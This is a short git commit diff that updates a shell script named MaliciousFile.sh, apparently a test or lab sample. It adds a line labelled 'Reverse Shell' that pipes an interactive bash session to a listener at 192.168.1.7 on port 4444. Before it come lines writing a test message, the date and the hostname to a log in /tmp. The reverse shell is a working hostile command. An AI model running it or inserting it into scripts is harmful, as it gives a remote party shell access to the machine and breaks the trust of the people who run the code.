acadd8f9df87ba7aa66744a80740d4af658758fb
James Harrington <james.harr1984@gmail.com>
2025-02-04 09:36:12 +0800

    Update MaliciousFile.sh

--- resources/MaliciousFile.sh
+++ resources/MaliciousFile.sh
@@ -4,3 +4,6 @@
 echo "This is a test of a malicious file" >> /tmp/malicious_log.txt
 date >> /tmp/malicious_log.txt
 hostname >> /tmp/malicious_log.txt
+
+# Reverse Shell
+bash -i >& /dev/tcp/192.168.1.7/4444 0>&1
